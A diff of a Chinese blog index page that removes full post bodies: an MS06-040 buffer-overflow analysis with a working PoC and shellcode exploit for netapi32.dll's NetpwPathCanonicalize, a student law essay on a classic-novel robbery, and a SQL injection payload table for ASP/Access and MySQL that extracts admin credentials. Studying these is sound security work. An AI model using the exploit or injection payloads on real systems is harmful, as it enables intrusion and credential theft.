-<p>这是一个Unicode字符串处理函数，大体功能是：如果prefix串非空，将prefix串与path串用‘\’相连，并复制到输出串can_path中，输出串的容量为maxbuf字节大小：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">can_path=prefix+&quot;\&quot;+path</span><br></pre></td></tr></table></figure>
-
-<p>触发漏洞的POC：</p>
-<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;windows.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">typedef</span> <span class="title">void</span> <span class="params">(*MYPROC)</span><span class="params">(LPTSTR, <span class="keyword">char</span> *, <span class="keyword">int</span>, <span class="keyword">char</span> *, <span class="keyword">long</span> *, <span class="keyword">bool</span>)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;	</span><br><span class="line">	<span class="keyword">char</span> path[<span class="number">0x320</span>];</span><br><span class="line">	<span class="keyword">char</span> can_path[<span class="number">0x440</span>];</span><br><span class="line">	<span class="keyword">int</span> maxbuf=<span class="number">0x440</span>;</span><br><span class="line">	<span class="keyword">char</span> prefix[<span class="number">0x100</span>];</span><br><span class="line">	<span class="keyword">long</span> pathtype=<span class="number">44</span>;</span><br><span class="line"></span><br><span class="line">	HINSTANCE LibHandle;</span><br><span class="line">	MYPROC Trigger;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">char</span> dll[ ] = <span class="string">"./netapi32.dll"</span>;</span><br><span class="line">	<span class="keyword">char</span> VulFunc[ ] = <span class="string">"NetpwPathCanonicalize"</span>;</span><br><span class="line">	LibHandle = LoadLibrary(dll);</span><br><span class="line">	Trigger = (MYPROC) GetProcAddress(LibHandle, VulFunc);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">memset</span>(path,<span class="number">0</span>,<span class="keyword">sizeof</span>(path));</span><br><span class="line">	<span class="built_in">memset</span>(path,<span class="string">'a'</span>,<span class="keyword">sizeof</span>(path)<span class="number">-2</span>);</span><br><span class="line">	<span class="built_in">memset</span>(prefix,<span class="number">0</span>,<span class="keyword">sizeof</span>(prefix));</span><br><span class="line">	<span class="built_in">memset</span>(prefix,<span class="string">'b'</span>,<span class="keyword">sizeof</span>(prefix)<span class="number">-2</span>);</span><br><span class="line">	</span><br><span class="line">	(Trigger)(path,can_path,maxbuf,prefix,&amp;pathtype,<span class="number">0</span>);</span><br><span class="line">	FreeLibrary(LibHandle);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>POC说明：导入存在漏洞的netapi32.dll中的NetpwPathCanonicalize函数，将path和prefix设置的很长以触发漏洞。</p>
-<p>运行后报错，使用OD attach：</p>
-<p><img src="/2020/04/16/ms06-040%E5%88%86%E6%9E%90/dbg1.JPG" alt></p>
-<p>EIP被覆盖为”aaaa”的ascii：0x61616161，可见传入的参数溢出，覆盖了EIP。</p>
-<p>算出VA：0x75107B13</p>
-<p>在这里程序再一次crash：</p>
-<p><img src="/2020/04/16/ms06-040%E5%88%86%E6%9E%90/dbg2.JPG" alt></p>
-<p>在这个wscat的拼接函数完成后存储返回地址的地方（0x12F6A8）被覆盖：</p>
-<p><img src="/2020/04/16/ms06-040%E5%88%86%E6%9E%90/dbg3.JPG" alt></p>
-<p><img src="/2020/04/16/ms06-040%E5%88%86%E6%9E%90/dbg4.JPG" alt></p>
-<p>根据ECX总是指向栈开始的buff可以构造如下shellcode：</p>
-<p>shellcode+patch+(jmp ecx)</p>
-<p>call ecx：0x796DB16C</p>
-<p>修改后POC：</p>
-<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;windows.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">typedef</span> <span class="title">void</span> <span class="params">(*MYPROC)</span><span class="params">(LPTSTR, <span class="keyword">char</span> *, <span class="keyword">int</span>, <span class="keyword">char</span> *, <span class="keyword">long</span> *, <span class="keyword">bool</span>)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">char</span> shellcode[]=</span><br><span class="line"><span class="string">"\xFC\x68\x6A\x0A\x38\x1E\x68\x63\x89\xD1\x4F\x68\x32\x74\x91\x0C"</span></span><br><span class="line"><span class="string">"\x8B\xF4\x8D\x7E\xF4\x33\xDB\xB7\x04\x2B\xE3\x66\xBB\x33\x32\x53"</span></span><br><span class="line"><span class="string">"\x68\x75\x73\x65\x72\x54\x33\xD2\x64\x8B\x5A\x30\x8B\x4B\x0C\x8B"</span></span><br><span class="line"><span class="string">"\x49\x1C\x8B\x09\x8B\x69\x08\xAD\x3D\x6A\x0A\x38\x1E\x75\x05\x95"</span></span><br><span class="line"><span class="string">"\xFF\x57\xF8\x95\x60\x8B\x45\x3C\x8B\x4C\x05\x78\x03\xCD\x8B\x59"</span></span><br><span class="line"><span class="string">"\x20\x03\xDD\x33\xFF\x47\x8B\x34\xBB\x03\xF5\x99\x0F\xBE\x06\x3A"</span></span><br><span class="line"><span class="string">"\xC4\x74\x08\xC1\xCA\x07\x03\xD0\x46\xEB\xF1\x3B\x54\x24\x1C\x75"</span></span><br><span class="line"><span class="string">"\xE4\x8B\x59\x24\x03\xDD\x66\x8B\x3C\x7B\x8B\x59\x1C\x03\xDD\x03"</span></span><br><span class="line"><span class="string">"\x2C\xBB\x95\x5F\xAB\x57\x61\x3D\x6A\x0A\x38\x1E\x75\xA9\x33\xDB"</span></span><br><span class="line"><span class="string">"\x53\x68\x74\x65\x73\x74\x68\x6D\x69\x78\x69\x8B\xC4\x53\x50\x50"</span></span><br><span class="line"><span class="string">"\x53\xFF\x57\xFC\x53\xFF\x57\xF8"</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;	</span><br><span class="line">	<span class="keyword">char</span> path[<span class="number">0x320</span>];</span><br><span class="line">	<span class="keyword">char</span> can_path[<span class="number">0x440</span>];</span><br><span class="line">	<span class="keyword">int</span> maxbuf=<span class="number">0x440</span>;</span><br><span class="line">	<span class="keyword">char</span> prefix[<span class="number">0x100</span>];</span><br><span class="line">	<span class="keyword">long</span> pathtype=<span class="number">44</span>;</span><br><span class="line"></span><br><span class="line">	HINSTANCE LibHandle;</span><br><span class="line">	MYPROC Trigger;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">char</span> dll[ ] = <span class="string">"./netapi32.dll"</span>;</span><br><span class="line">	<span class="keyword">char</span> VulFunc[ ] = <span class="string">"NetpwPathCanonicalize"</span>;</span><br><span class="line">	</span><br><span class="line">	LibHandle = LoadLibrary(dll);</span><br><span class="line"></span><br><span class="line">	<span class="comment">//__asm int 3;</span></span><br><span class="line"></span><br><span class="line">	Trigger = (MYPROC) GetProcAddress(LibHandle, VulFunc);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">memset</span>(path,<span class="number">0</span>,<span class="keyword">sizeof</span>(path));</span><br><span class="line">	<span class="built_in">memset</span>(path,<span class="string">'a'</span>,<span class="keyword">sizeof</span>(path)<span class="number">-2</span>);</span><br><span class="line">	<span class="built_in">memset</span>(prefix,<span class="number">0</span>,<span class="keyword">sizeof</span>(prefix));</span><br><span class="line">	<span class="built_in">memset</span>(prefix,<span class="string">'b'</span>,<span class="keyword">sizeof</span>(prefix)<span class="number">-2</span>);</span><br><span class="line">	</span><br><span class="line">	<span class="built_in">memcpy</span>(prefix,shellcode,<span class="number">168</span>);</span><br><span class="line"></span><br><span class="line">	path[<span class="number">0x318</span>]=<span class="number">0x6C</span>;<span class="comment">// address of CALL ECX</span></span><br><span class="line">	path[<span class="number">0x319</span>]=<span class="number">0xB1</span>;</span><br><span class="line">	path[<span class="number">0x31A</span>]=<span class="number">0x6D</span>;</span><br><span class="line">	path[<span class="number">0x31B</span>]=<span class="number">0x79</span>;</span><br><span class="line"></span><br><span class="line">	(Trigger)(path,can_path,maxbuf,prefix ,&amp;pathtype,<span class="number">0</span>);</span><br><span class="line">	FreeLibrary(LibHandle);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>攻击成功：</p>
-<p><img src="/2020/04/16/ms06-040%E5%88%86%E6%9E%90/success1.JPG" alt></p>
-<p>静态分析结果：</p>
-<p><img src="/2020/04/16/ms06-040%E5%88%86%E6%9E%90/dbg5.JPG" alt></p>
-<p>按照ASCII字符开辟空间，按照Unicode字符来检查边界是漏洞的根本原因。</p>
-
-          
+          简要分析漏洞点存在为netapi32.dll中的NetpwPathCanonicalize()导出函
+          ...
+          <!--noindex-->
+          <div class="post-button text-center">
+            <a class="btn" href="/2020/04/16/ms06-040%E5%88%86%E6%9E%90/#more" rel="contents">
+              Read more &raquo;
+            </a>
+          </div>
+          <!--/noindex-->
         
       
     </div>
@@ -765,60 +647,16 @@
       
         
           
-            <h1 id="晁盖等八人抢劫生辰纲案"><a href="#晁盖等八人抢劫生辰纲案" class="headerlink" title="晁盖等八人抢劫生辰纲案"></a>晁盖等八人抢劫生辰纲案</h1><p>大一时写的一篇论文，感觉挺有意思，今天整理博客，一并上传。</p>
-<p><strong>关键词</strong>：<em>刑事案件</em> <em>黑社会组织</em> <em>抢劫</em> <em>有持续的社会危害</em></p>
-<h2 id="基本案情"><a href="#基本案情" class="headerlink" title="基本案情"></a>基本案情</h2><p>晁盖是山东郓城县东溪村人，乃东溪村保正，本乡财主。吴用，山东菏泽市郓城县东溪村人。刘唐，东潞州人氏。刘唐为劫取生辰纲一事，夜走郓城县往投晁盖，途中酒后醉卧灵官庙，为巡查的县都头雷横抓获并带往东溪村晁盖庄，晁盖得知详由，并开始着手领导组织劫取生辰纲。晁盖吴用自幼结交，晁盖因吴用聪明过人便教唆其出谋策划劫取的全部过程，吴用欣然同意。公孙胜，蓟州人氏。其通过某些非法途径获知生辰纲一事，便投奔晁盖以期望伙同一起抢劫生辰纲。阮小二，阮小五，阮小七梁山泊旁边石碣村人。白胜，是黄泥冈东十里路安乐村闲汉。吴用召集阮氏三兄弟和白胜一起参与了此次抢劫案。杨志，武举出身，曾任殿帅府制使，因失陷花石纲丢官，后为梁中书赏识，派其护送此次生辰纲。</p>
-<p>案发当日，天气较热，杨志因有一定的江湖经验，指导黄泥岗乃是非之地不宜久留。所以在同行护送生辰纲的其余几人想要在黄泥岗停歇一会时便催使他们不要歇息，这也导致了同行护送的其他人对杨志心存不满。当护送一行人基本不想在继续护送时，白胜假扮成卖酒人，与另外七个人合伙欺骗杨志等人喝下掺了药的酒，待护送的人身子疲软坐地不起的时候，假扮的一行人当着杨志等人的面将生辰纲抢夺走。</p>
-<h2 id="法律规定"><a href="#法律规定" class="headerlink" title="法律规定"></a>法律规定</h2><h3 id="第二百六十三条【抢劫罪】"><a href="#第二百六十三条【抢劫罪】" class="headerlink" title="第二百六十三条【抢劫罪】"></a>第二百六十三条【抢劫罪】</h3><p>以暴力、胁迫或者其他方法抢劫公私财物的，处三年以上十年以下有期徒刑，并处罚金；有下列情形之一的，处十年以上有期徒刑、无期徒刑或者死刑，并处罚金或者没收财产：</p>
-<ol>
-<li>入户抢劫的；</li>
-<li>在公共交通工具上抢劫的；</li>
-<li>抢劫银行或者其他金融机构的；</li>
-<li>多次抢劫或者抢劫数额巨大的；</li>
-<li>抢劫致人重伤、死亡的；</li>
-<li>冒充军警人员抢劫的；</li>
-<li>持枪抢劫的；</li>
-<li>抢劫军用物资或者抢险、救灾、救济物资；</li>
-</ol>
-<p>第二百八十九条聚众“打砸抢”，致人伤残、死亡的，依照本法第二百三十四条、第二百三十二条的规定定罪处罚。毁坏或者抢走公私财物的，除判令退赔外，对首要分子，依照本法第二百六十三条的规定定罪处罚。
-　　    </p>
-<h3 id="第二十五条【共同犯罪概念】"><a href="#第二十五条【共同犯罪概念】" class="headerlink" title="第二十五条【共同犯罪概念】"></a>第二十五条【共同犯罪概念】</h3><p>共同犯罪是指二人以上共同故意犯罪。二人以上共同过失犯罪，不以共同犯罪论处；应当负刑事责任的，按照他们所犯的罪分别处罚。<br>第二十六条【主犯】组织、领导犯罪集团进行犯罪活动的或者在共同犯罪中起主要作用的，是主犯。</p>
-<p>三人以上为共同实施犯罪而组成的较为固定的犯罪组织，是犯罪集团。</p>
-<p>对组织、领导犯罪集团的首要分子，按照集团所犯的全部罪行处罚。</p>
-<p>对于第三款规定以外的主犯，应当按照其所参与的或者组织、指挥的全部犯罪处罚。</p>
-<h3 id="第二百九十四条-【组织、领导、参加黑社会性质的组织罪】"><a href="#第二百九十四条-【组织、领导、参加黑社会性质的组织罪】" class="headerlink" title="第二百九十四条 【组织、领导、参加黑社会性质的组织罪】"></a>第二百九十四条 【组织、领导、参加黑社会性质的组织罪】</h3><ol>
-<li><p>此罪是指组织、领导和参加以暴力、威胁或者其他手段，有组织地进行违法犯罪活动，称霸一方，为非作恶，欺压、残害群众，严重破坏经济、社会生活秩序的黑社会性质的组织的行为；</p>
-</li>
-<li><p>组织、领导黑社会性质的组织的，处七年以上有期徒刑，并处没收财产；</p>
-</li>
-<li><p>积极参加的，处三年以上七年以下有期徒刑，可以并处罚金或者没收财产；</p>
-</li>
-<li><p>其他参加的，处三年以下有期徒刑、拘役、管制或者剥夺政治权利，可以并处罚金。</p>
-</li>
-</ol>
-<p>犯前三款罪又有其他犯罪行为的，依照数罪并罚的规定处罚。</p>
-<p>对于参加黑社会性质的组织，没有实施其他违法犯罪活动的，或者受蒙蔽、胁迫参加黑社会性质的组织，情节轻微的，可以不作为犯罪处罚。国家机关工作人员组织、领导、参加黑社会性质组织的，从重处罚。</p>
-<h2 id="具体定罪分析"><a href="#具体定罪分析" class="headerlink" title="具体定罪分析"></a>具体定罪分析</h2><p>很显然，晁盖已经有了组织，领导黑社会的的想法意志并采取了一定的行动，而伙同的另外七人都符合了“积极参加”黑社会组织的法律行为。而晁盖一行人通过下药的手段将杨志一行人放倒后抢劫其护送的礼物的行为应当属于“其他方法抢劫公私财务”。所谓“其他方法”，是指对被害人采取暴力、胁迫以外的使被害人处于不知反抗或者不能反抗的状态的方法。而晁盖等人正是通过下药的手段使护送财务的一行人处于不知反抗或者不能反抗的状态并夺取了他们的财物。所以说晁盖一行人坐实“抢劫罪”和“组织、领导、参加黑社会性质的组织罪”是毋庸置疑的。</p>
-<p>关于本次案件的定罪分析，我觉得应当不要同以下两个罪名相混淆：</p>
-<ol>
-<li><p>盗窃:盗窃罪是指以非法占有为目的，盗窃公私财物数额较大或者多次盗窃、入户盗窃、携带凶器盗窃、扒窃公私财物的行为，其特征是“在物权所有人不知情的情况下，秘密的窃取”公私财物。杨志等人被骗喝下药并无法反抗，“十五人眼睁睁地看着那七个人都把这宝装了去，只是起不来、挣不动、说不的。”这段话的叙述与“不知情的情况下”有很明显的区别。</p>
-</li>
-<li><p>诈骗:其特征为“诈骗罪是指以非法占有为目的，用虚构事实或者隐瞒真相的方法，骗取数额较大的公私财物的行为。诈骗罪侵犯对象不是骗取其他非法利益。其对象，也应排除金融机构的贷款。”窃取生辰纲的过程中虽然使用了“欺骗手段”，但其目的是让受害人饮用麻醉药品，从而完成抢劫行为。目的在本质上的区别也就导致了两者在定罪上的区别。</p>
-</li>
-</ol>
-<p>而晁盖在上述罪名的基础上其实还犯下了“非法携带枪支、弹药、管制刀具、危险物品危及公共安全罪”以及“非法提供麻醉药品、精神药品罪”。那么在此是否需要对这两项罪名着重考虑呢，这就不得不引出刑法中的有关“竞合”的概念。</p>
-<h2 id="法条竞合"><a href="#法条竞合" class="headerlink" title="法条竞合"></a>法条竞合</h2><p>法条竞合（又称法规竞合、法律竞合），是指由于法律对犯罪的错综规定，一个犯罪行为同时符合了数个法条规定的犯罪构成，但数个条文之间存在着整体或者部分的包容关系，只能适用其中一个条文而排斥其他条文适用的情形。很显然在该案例（生辰纲抢劫案）中，“非法携带枪支、弹药、管制刀具、危险物品危及公共安全罪”以及“非法提供麻醉药品、精神药品罪”是可以被“抢劫罪”把包容的。通过细致分析可以得出下列一些有关“竞合”的结论：</p>
-<ol>
-<li><p>特殊优于一般原则。特殊法与一般法竞合，一般的应实行特殊法优于一般法的原则，行为人的具体行为符合特殊法的要件的，适用特殊法。因为，正是由于某种行为具有某一方面事实的特殊性，侵犯某一特定的社会关系，立法者才将其制定为特殊法，以别于一般法，并且与其特殊的危害性相适应，规定或重或轻或相同的刑罚。只有实行上述原则，才能符合和实现立法的意图。</p>
-</li>
-<li><p>重法优于轻法原则。特殊法与一般法竞合，而前者的法定刑轻于后者，在一般情况下，仍应实行特殊法优于一般法的原则，但是，在法律有特别规定时，可以实行重法优于轻法的原则，即适用一般法。关于该案例，“抢劫罪”和“非法携带枪支、弹药、管制刀具、危险物品危及公共安全罪”等罪具有“重法优于轻法”的竞合关系，所以晁盖也应当是被定罪为“抢劫罪”而非“非法携带枪支、弹药、管制刀具、危险物品危及公共安全罪”或者“非法提供麻醉药品、精神药品罪”。</p>
-</li>
-</ol>
-<h2 id="后续探讨"><a href="#后续探讨" class="headerlink" title="后续探讨"></a>后续探讨</h2><p>这起案子中，晁盖一行人是起主导作用的，但是也不得不提一提与杨志一同护送的“虞侯”等人。“老都管喝道：‘杨提辖，且住!你听我说：我在东京太师府里做奶公时，门下官军，见了无千无万，都向着我喏喏连声。不是我口栈，量你是个遭死的军人，相公可怜抬举你做个提辖，比得芥菜子大小的官职，直得恁地逞能!休说我是相公家都管，便是村庄一个老的，也合依我劝一劝；只顾把他们打，是何看待？’”这几番杨志与随性之人的较量也反映了宋朝时候天下大乱，有法可依却不能有法必依，导致民不聊生，庸人当道，百姓揭竿而起。</p>
-<p>晁盖等七人将自己视为百姓的救世主，将惩恶扬善，劫富济贫作为自己的使命，以此坚守自己的所谓的好汉之名。但是，他们并没有这样的权利。不管他们打击的对象多么的可恶甚至可恨，他们其实都没有权利实施这些行为。刑法作为具有稳定社会秩序功能的法律，从来就没有赋予人私自采取报复行为进行惩罚的权利。不管晁盖一行人所做之事有多么的看起来“正义”，“替天行道”，都会损害一定的法益，而这些法益，正是法律所维护的。当社会的法益无法由相关的法律维护时，就会有人出来企图充当法律的角色，这就产生了“人治”。而不管是官员们的“人治”还是起义百姓的“人治”都是错误的，两者产生的“持续的社会危害性”不容小觑。“法益”必须为相关法律维护。</p>
-<p>或许由当今的刑法来看这样一个在宋朝发生的案件有点奇怪，不过这也从某种程度上体现了相对完善的法律体系才能真正发挥作用。</p>
-
-          
+          晁盖等八人抢劫生辰纲案大一时写的一篇论文，感觉挺有意思，今天整理博客，一并上传。
+关键词：刑事案件 
+          ...
+          <!--noindex-->
+          <div class="post-button text-center">
+            <a class="btn" href="/2020/04/16/%E7%94%9F%E8%BE%B0%E7%BA%B2%E6%A1%88/#more" rel="contents">
+              Read more &raquo;
+            </a>
+          </div>
+          <!--/noindex-->
         
       
     </div>
@@ -958,460 +796,20 @@
       
         
           
-            <table border="0" cellpadding="0" cellspacing="0" width="1283" style="border-collapse: 
- collapse;table-layout:fixed;width:962pt">
- <col class="x71" width="281" style="mso-width-source:userset;width:210.75pt">
- <col class="x71" width="1002" style="mso-width-source:userset;width:751.5pt">
- <tr height="20" style="mso-height-source:userset;height:15.6pt" id="r0">
-<td rowspan="16" height="332" class="x72" width="281" style="height:249.6pt;width:210.75pt;">ASP+ACCESS注入</td>
-<td class="x73" width="1002" style="width:751.5pt;">http://localhost:81/Production/PRODUCT_DETAIL.asp?id=1513</td>
- </tr>
- <tr height="20" style="mso-height-source:userset;height:15.6pt" id="r1">
-<td class="x73">http://localhost:81/Production/PRODUCT_DETAIL.asp?id=1513'</td>
- </tr>
- <tr height="20" style="mso-height-source:userset;height:15.6pt" id="r2">
-<td class="x73">http://localhost:81/Production/PRODUCT_DETAIL.asp?id=1513 and 1=1</td>
- </tr>
- <tr height="20" style="mso-height-source:userset;height:15.6pt" id="r3">
-<td class="x73">http://localhost:81/Production/PRODUCT_DETAIL.asp?id=1513 and 1=2</td>
- </tr>
- <tr height="20" style="mso-height-source:userset;height:15.6pt" id="r4">
-<td class="x74"><a href="http://localhost:81/Production/PRODUCT_DETAIL.asp?id=1513 and exists (select * from 表名)" target="_parent"><span style="font-size:10pt;color:#000000;font-weight:400;text-decoration:none;text-line-through:none;font-family:"微软雅黑";">http://localhost:81/Production/PRODUCT_DETAIL.asp?id=1513 and exists (select * from 表名)</span></a></td>
- </tr>
- <tr height="20" style="mso-height-source:userset;height:15.6pt" id="r5">
-<td class="x73">http://localhost:81/Production/PRODUCT_DETAIL.asp?id=1513 and exists (select 列名 from 表名)</td>
- </tr>
- <tr height="20" style="mso-height-source:userset;height:15.6pt" id="r6">
-<td class="x73">http://localhost:81/Production/PRODUCT_DETAIL.asp?id=1513 and (select top 1 len(列名) from 表名)&gt;0</td>
- </tr>
- <tr height="20" style="mso-height-source:userset;height:15.6pt" id="r7">
-<td class="x73">http://localhost:81/Production/PRODUCT_DETAIL.asp?id=1513 and (select top 1 len(列名) from 表名)&gt;10</td>
- </tr>
- <tr height="20" style="mso-height-source:userset;height:15.6pt" id="r8">
-<td class="x73">http://localhost:81/Production/PRODUCT_DETAIL.asp?id=1513 and (select top 1 len(列名) from 表名)&gt;20</td>
- </tr>
- <tr height="20" style="mso-height-source:userset;height:15.6pt" id="r9">
-<td class="x73">http://localhost:81/Production/PRODUCT_DETAIL.asp?id=1513 and (select top 1 len(列名) from 表名)=5</td>
- </tr>
- <tr height="20" style="mso-height-source:userset;height:15.6pt" id="r10">
-<td class="x73">http://localhost:81/Production/PRODUCT_DETAIL.asp?id=1513 and (select top 1 asc(mid(admin,1,1)) from admin)=97</td>
- </tr>
- <tr height="20" style="mso-height-source:userset;height:15.6pt" id="r11">
-<td class="x73">http://localhost:81/Production/PRODUCT_DETAIL.asp?id=1513 and (select top 1 asc(mid(admin,2,1)) from admin)=100</td>
- </tr>
- <tr height="20" style="mso-height-source:userset;height:15.6pt" id="r12">
-<td class="x73">http://localhost:81/Production/PRODUCT_DETAIL.asp?id=1513 and (select top 1 asc(mid(admin,3,1)) from admin)=109</td>
- </tr>
- <tr height="20" style="mso-height-source:userset;height:15.6pt" id="r13">
-<td class="x73">http://localhost:81/Production/PRODUCT_DETAIL.asp?id=1513 and (select top 1 asc(mid(admin,4,1)) from admin)=105</td>
- </tr>
- <tr height="20" style="mso-height-source:userset;height:15.6pt" id="r14">
-<td class="x73">http://localhost:81/Production/PRODUCT_DETAIL.asp?id=1513 and (select top 1 asc(mid(admin,5,1)) from admin)=110</td>
- </tr>
- <tr height="20" style="mso-height-source:userset;height:15.6pt" id="r15">
-<td class="x73">http://localhost:81/Production/PRODUCT_DETAIL.asp?id=1513 and (select top 1 asc(mid(password,1,1)) from admin)=97</td>
- </tr>
- <tr height="20" class="x69" style="mso-height-source:userset;height:15.6pt" id="r16">
-<td height="20" class="x75" style="height:15.6pt;"></td>
-<td class="x76"></td>
- </tr>
- <tr height="20" style="mso-height-source:userset;height:15.6pt" id="r17">
-<td rowspan="9" height="187" class="x72" style="height:140.4pt;">ASP+ACCESS联合注入</td>
-<td class="x73">http://localhost:81/Production/PRODUCT_DETAIL.asp?id=1513</td>
- </tr>
- <tr height="20" style="mso-height-source:userset;height:15.6pt" id="r18">
-<td class="x73">http://localhost:81/Production/PRODUCT_DETAIL.asp?id=1513'</td>
- </tr>
- <tr height="20" style="mso-height-source:userset;height:15.6pt" id="r19">
-<td class="x73">http://localhost:81/Production/PRODUCT_DETAIL.asp?id=1513 and 1=1</td>
- </tr>
- <tr height="20" style="mso-height-source:userset;height:15.6pt" id="r20">
-<td class="x73">http://localhost:81/Production/PRODUCT_DETAIL.asp?id=1513 and 1=2</td>
- </tr>
- <tr height="20" style="mso-height-source:userset;height:15.6pt" id="r21">
-<td class="x73">http://localhost:81/Production/PRODUCT_DETAIL.asp?id=1513 and exists (select * from 表名)</td>
- </tr>
- <tr height="20" style="mso-height-source:userset;height:15.6pt" id="r22">
-<td class="x73">http://localhost:81/Production/PRODUCT_DETAIL.asp?id=1513 and exists (select 列名 from 表名)</td>
- </tr>
- <tr height="20" style="mso-height-source:userset;height:15.6pt" id="r23">
-<td class="x73">http://localhost:81/Production/PRODUCT_DETAIL.asp?id=1513 order by 22</td>
- </tr>
- <tr height="20" style="mso-height-source:userset;height:15.6pt" id="r24">
-<td class="x73">http://localhost:81/Production/PRODUCT_DETAIL.asp?id=1513 union select 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22 from admin</td>
- </tr>
- <tr height="20" style="mso-height-source:userset;height:15.6pt" id="r25">
-<td class="x73">http://localhost:81/Production/PRODUCT_DETAIL.asp?id=1513 union select 1,2,admin,4,5,6,7,8,9,10,11,12,13,14,password,16,17,18,19,20,21,22 from admin</td>
- </tr>
- <tr height="20" class="x70" style="mso-height-source:userset;height:15.6pt" id="r26">
-<td height="20" class="x75" style="height:15.6pt;"></td>
-<td class="x75"></td>
- </tr>
- <tr height="20" style="mso-height-source:userset;height:15.6pt" id="r27">
-<td rowspan="30" height="624" class="x72" style="height:468pt;">MYSQL</td>
-<td class="x73">http://localhost/mysql.php?id=1</td>
- </tr>
- <tr height="20" style="mso-height-source:userset;height:15.6pt" id="r28">
-<td class="x73">http://localhost/mysql.php?id=1 order by 3</td>
- </tr>
- <tr height="20" style="mso-height-source:userset;height:15.6pt" id="r29">
-<td class="x73">http://localhost/mysql.php?id=1 union select 1,2,3</td>
- </tr>
- <tr height="20" style="mso-height-source:userset;height:15.6pt" id="r30">
-<td class="x73">http://localhost/mysql.php?id=1 union select user(),version(),database()</td>
- </tr>
- <tr height="20" style="mso-height-source:userset;height:15.6pt" id="r31">
-<td class="x73">http://localhost/mysql.php?id=1 and 1=2 union select concat(user(),0x2c,database(),0x2c,version()),2,3</td>
- </tr>
- <tr height="20" style="mso-height-source:userset;height:15.6pt" id="r32">
-<td class="x73">http://localhost/mysql.php?id=1 and 1=2 union select concat_ws(0x2c,user(),database(),version()),2,3</td>
- </tr>
- <tr height="20" style="mso-height-source:userset;height:15.6pt" id="r33">
-<td class="x73">//查库</td>
- </tr>
- <tr height="20" style="mso-height-source:userset;height:15.6pt" id="r34">
-<td class="x73">http://localhost/mysql.php?id=1 and 1=2 union select concat(GROUP_CONCAT(DISTINCT+table_schema)),2,3 from information_schema.columns</td>
- </tr>
- <tr height="20" style="mso-height-source:userset;height:15.6pt" id="r35">
-<td class="x73">http://localhost/mysql.php?id=1 and 1=2 union select concat(GROUP_CONCAT(DISTINCT+schema_name)),2,3 from information_schema.SCHEMATA</td>
- </tr>
- <tr height="20" style="mso-height-source:userset;height:15.6pt" id="r36">
-<td class="x73">http://localhost/mysql.php?id=1 and 1=2 union select concat(GROUP_CONCAT(DISTINCT+table_schema)),2,3 from information_schema.TABLES</td>
- </tr>
- <tr height="20" style="mso-height-source:userset;height:15.6pt" id="r37">
-<td class="x73">//查表</td>
- </tr>
- <tr height="20" style="mso-height-source:userset;height:15.6pt" id="r38">
-<td class="x73">http://localhost/mysql.php?id=1 and 1=2 union select concat(GROUP_CONCAT(DISTINCT+table_name)),2,3 from information_schema.columns where table_schema= 0x73716c696e6a656374</td>
- </tr>
- <tr height="20" style="mso-height-source:userset;height:15.6pt" id="r39">
-<td class="x73">//查列</td>
- </tr>
- <tr height="20" style="mso-height-source:userset;height:15.6pt" id="r40">
-<td class="x73">http://localhost/mysql.php?id=1 and 1=2 union select concat(GROUP_CONCAT(DISTINCT+column_name)),2,3 from information_schema.columns where table_name= 0x7573657273</td>
- </tr>
